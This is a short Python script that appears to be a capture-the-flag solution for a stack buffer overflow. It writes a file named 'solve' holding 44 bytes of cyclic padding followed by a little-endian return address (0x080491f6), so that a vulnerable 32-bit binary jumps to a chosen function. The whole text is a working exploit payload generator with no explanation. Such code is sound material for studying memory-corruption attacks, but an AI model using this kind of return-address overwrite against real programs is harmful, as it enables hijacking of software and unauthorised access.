padding = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa'
payload = int.to_bytes(0x080491f6, 4, 'little')
fd = open("solve", "wb")
res = padding + payload
fd.write(res)
fd.close()


